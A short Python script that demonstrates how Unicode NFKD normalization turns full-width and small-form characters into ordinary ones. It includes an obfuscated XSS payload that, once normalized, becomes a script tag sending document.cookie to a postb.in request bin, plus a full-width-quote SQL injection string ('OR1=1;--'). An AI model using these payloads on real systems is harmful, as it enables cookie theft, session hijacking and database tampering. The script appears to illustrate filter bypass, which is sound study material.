import unicodedata

a = "chloe\u0301"
b = "chlo\u00e9"


print(unicodedata.normalize("NFKD", a) == unicodedata.normalize("NFKD", b))

print(unicodedata.normalize("NFKD", "\ufe64\uff53cript\ufe65"))


payload = "\ufe64\uff53cript\ufe65document.location=\uff02https://postb.in/1632637016805-4324635250959?cookie=\uff02+document.cookie;\ufe64/\uff53cript\ufe65"
print(unicodedata.normalize("NFKD", payload))

payload = "\uff02OR1=1;--"
print(unicodedata.normalize("NFKD", payload))
